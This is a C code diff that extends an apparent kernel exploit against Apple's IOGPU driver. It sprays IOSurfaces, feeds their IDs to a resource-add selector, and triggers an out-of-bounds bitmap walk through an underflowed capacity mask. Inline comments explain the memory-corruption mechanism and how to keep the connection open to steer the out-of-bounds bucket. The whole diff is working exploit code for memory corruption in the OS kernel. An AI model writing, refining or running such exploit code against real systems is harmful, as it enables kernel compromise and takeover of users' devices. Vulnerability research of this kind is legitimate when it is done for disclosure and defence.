@@ -232,7 +232,26 @@ void nk_iogpu_group_oob_run(int trigger)
        resources, and the cmd-130 lookup compares element->0x10 with the key,
        so the surface's global id is a prime key candidate. */
     uint32_t surf_id = 0;
+    uint32_t surf_ids[8];
+    uint32_t nsurf = 0;
     IOSurfaceRef surf = NULL;
+    for (uint32_t si = 0; si < 8; si++) {
+        CFNumberRef w  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){1});
+        CFNumberRef h  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x1000 + si * 16});
+        CFNumberRef bpe= CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){4});
+        CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x42475241});
+        const void *keys[]   = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
+        const void *values[] = { w, h, bpe, pf };
+        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 4,
+                                                  &kCFTypeDictionaryKeyCallBacks,
+                                                  &kCFTypeDictionaryValueCallBacks);
+        IOSurfaceRef s2 = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
+        uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        uint32_t id2 = (getid && s2) ? getid(s2) : 0;
+        if (id2) surf_ids[nsurf++] = id2;
+        if (si == 0) { surf = s2; surf_id = id2; }
+    }
     {
         CFNumberRef w  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){1});
         CFNumberRef h  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x1000});
@@ -245,9 +264,7 @@ void nk_iogpu_group_oob_run(int trigger)
                                                   &kCFTypeDictionaryValueCallBacks);
         surf = IOSurfaceCreate(props);
         CFRelease(props); CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
-        uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
-        if (getid && surf) surf_id = getid(surf);
-        ol("[grp] IOSurface=%p global id=%u", (void *)surf, surf_id);
+        ol("[grp] IOSurface=%p global id=%u (%u surfaces)", (void *)surf, surf_id, nsurf);
     }
 
     if (trigger) {
@@ -286,16 +303,38 @@ void nk_iogpu_group_oob_run(int trigger)
                 ol("[grp] GROW key[%u] = 0x%016llx", k, (unsigned long long)keys[k]);
                 kr = call_sel(conn, CMD_ADD_RES, keys[k], 1, 0, 0, out, &on);
                 ol("[grp] GROW key[%u] -> kr=0x%x", k, kr);
-                if (kr == 0 || kr == (int)0x10000003) {
-                    if (kr == 0) {
-                        ol("[grp] *** GROW key[%u] ACCEPTED (kr=0) - closing to destroy "
-                           "the group (underflowed bitmap walk)", k);
-                    } else {
-                        ol("[grp] *** GROW key[%u] -> client died (0x10000003 INVALID_DEST) "
-                           "- the group destructor already tripped", k);
+                if (kr == 0) {
+                    /* The group accepted a resource. count went 0->1, the grow
+                     * path recomputed capacity = 2*count = 2 and stored
+                     * obj+0x28 = (2>>6)-1 = 0xffffffff. The bitmap itself is
+                     * only (capacity+63)/8 = 8 bytes, so every later bucket
+                     * index is out of bounds.
+                     * Do NOT close yet: keep the connection so we can keep
+                     * adding resources (each add grows the group again and
+                     * moves the out-of-bounds bucket), and only close at the
+                     * very end. */
+                    ol("[grp] *** GROW key[%u] ACCEPTED (kr=0) - group count is now >=1, "
+                       "mask should be 0xffffffff", k);
+                    ol("[grp] adding more resources (each add re-grows the group)");
+                    for (uint32_t extra = 0; extra < 8 && extra < nsurf; extra++) {
+                        ol("[grp] EXTRA add surf_id=%u", surf_ids[extra]);
+                        int ke = call_sel(conn, CMD_ADD_RES, surf_ids[extra], 1, 0, 0, out, &on);
+                        ol("[grp] EXTRA add surf_id=%u -> kr=0x%x", surf_ids[extra], ke);
+                        if (ke == (int)0x10000003) {
+                            ol("[grp] client died on the extra add (INVALID_DEST) - "
+                               "the out-of-bounds access already hit unmapped memory");
+                            break;
+                        }
                     }
+                    ol("[grp] closing the connection (group destructor walks the bitmap "
+                       "with the underflowed mask)");
                     IOServiceClose(conn);
                     ol("[grp] connection closed");
+                    return;
+                }
+                if (kr == (int)0x10000003) {
+                    ol("[grp] *** GROW key[%u] -> client died (0x10000003 INVALID_DEST) "
+                       "- the group destructor already tripped", k);
                     return;
                 }
             }
